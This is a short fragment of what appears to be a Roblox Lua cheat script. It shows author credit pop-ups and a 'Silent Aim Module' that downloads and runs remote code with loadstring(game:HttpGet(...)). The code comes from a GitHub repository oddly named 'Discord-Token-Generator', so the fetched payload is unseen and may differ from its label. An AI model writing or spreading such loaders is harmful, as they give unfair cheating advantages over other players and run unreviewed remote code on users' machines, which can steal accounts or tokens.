...
NotifyLib.prompt('shezan sil - gl', 'Loading..', 5)
NotifyLib.prompt('on top', 'Son Them', 5)
NotifyLib.prompt('make em pack abt it', '!shezanpa#2125', 5)
...
-- // Silent Aim Module
local SilentAim = loadstring(game:HttpGet("https://raw.githubusercontent.com/shezan78/Discord-Token-Generator/main/blobforvalientsilentaimmain.lua"))()
